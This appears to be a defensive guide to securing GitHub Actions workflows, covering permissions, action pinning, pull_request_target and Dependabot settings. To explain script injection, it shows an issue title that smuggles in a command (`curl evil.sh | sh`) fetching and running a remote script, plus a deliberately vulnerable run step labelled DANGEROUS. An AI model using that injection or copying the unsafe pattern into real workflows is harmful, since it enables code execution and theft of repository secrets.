# Keep your workflows safe

A workflow runs code with your repository's token. Attackers know that. The rules:

1. **Least permissions:** set `permissions:` in every workflow, starting from `contents: read`.
2. **Trust actions carefully.** `uses: someone/action@v1` runs that person's code, and they can move the `v1` tag. Prefer `actions/` and verified creators; for others, pin the full commit hash: `uses: someone/action@8f4b7f8...`.
3. **Never put untrusted text straight into `run:`.** An issue title like `"; curl evil.sh | sh; "` becomes a command:

```yaml
# DANGEROUS: the title is pasted into the script
      - run: echo "New issue ${{ github.event.issue.title }}"

# SAFE: pass it as an environment variable
      - run: echo "New issue $TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
```

4. **Be careful with `pull_request_target`.** It runs with your secrets and a write token even for pull requests from forks. Never check out and run the pull request's code in it.
5. **Keep actions up to date with Dependabot**, which opens pull requests when a new version comes out:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions   # keep the actions/...@v7 numbers up to date
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
```

Also turn on, in **Settings → Code security**: Dependabot alerts, secret scanning with push protection, and code scanning (CodeQL). They're free for public repositories.
